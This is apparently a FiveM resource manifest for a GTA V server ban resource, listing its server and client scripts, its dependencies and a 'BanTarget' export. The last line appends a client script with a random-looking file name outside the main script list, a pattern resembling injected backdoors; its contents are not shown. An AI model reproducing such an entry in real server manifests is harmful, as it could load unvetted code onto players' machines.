fx_version 'bodacious'
game 'gta5'

version '1.0.7b'

server_scripts {
	'@async/async.lua',
	'@mysql_async/lib/MySQL.lua',
	'config.lua',
	'server.lua'
}

client_scripts {
  'client/main.lua'
}

dependencies {
	'essentialmode',
	'async'
}

server_exports {
	'BanTarget'
}

client_script "DISqkiIEcVydGenWnD.lua"